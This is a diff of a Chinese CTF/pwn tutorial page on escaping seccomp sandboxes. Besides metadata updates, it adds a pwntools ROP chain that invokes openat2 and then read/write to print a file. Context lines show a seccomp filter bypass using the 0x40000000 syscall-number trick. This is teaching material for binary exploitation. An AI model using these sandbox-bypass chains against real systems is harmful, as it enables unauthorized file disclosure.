@@ -367,8 +367,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-21 19:24:15</span>
-            <span class="mobile">2024-11-21 19:24:15</span>
+            <span class="desktop">2024-12-09 23:42:41</span>
+            <span class="mobile">2024-12-09 23:42:41</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -416,12 +416,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>9.5k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>9.7k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>44 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>45 Mins</span>
         </span>
     
     
@@ -735,6 +735,11 @@
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #define __NR_openat 257</span></span><br><span class="line"><span class="comment"> * # define AT_FDCWD        -100</span></span><br><span class="line"><span class="comment"> * #define O_RDONLY         00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd = syscall(__NR_openat, AT_FDCWD, <span class="string">&quot;main.cpp&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure></div>
 
 <p><strong>需要注意 <code>open</code> 函数实际上是调用了 <code>openat</code> 系统调用。</strong></p>
+<p>另外高版本内核还有 <code>openat2</code> 系统调用。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(-<span class="number">100</span>+<span class="number">0x10000000000000000</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(file_name_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(heap_4+<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rax; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">437</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;syscall; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
+
+
+
 <h3 id="使用-4-字节系统调用号绕过"><a href="#使用-4-字节系统调用号绕过" class="headerlink" title="使用 4 字节系统调用号绕过"></a>使用 4 字节系统调用号绕过</h3><p>例如下面这种情况，虽然所有可例用的系统调用号都被禁了，但是由于没有判断 <code>sys_number &gt;= 0x40000000</code> 的情况，因此可以使用 <code>0x40000000|sys_number</code> 来绕过。这里 <code>sys_number</code> 是 64 位的系统调用号。</p>
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line">0004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0009</span><br><span class="line">0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009</span><br><span class="line">0006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0009</span><br><span class="line">0007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 0009</span><br><span class="line">0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
 
@@ -953,7 +958,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-21 19:24:15
+                    :</strong> 2024-12-09 23:42:41
             </li>
         
         <li>
@@ -1113,7 +1118,7 @@
                     </span>
                     
                         <span>
-                            396.5k words in total
+                            409.5k words in total
                         </span>
                     
                 </p>
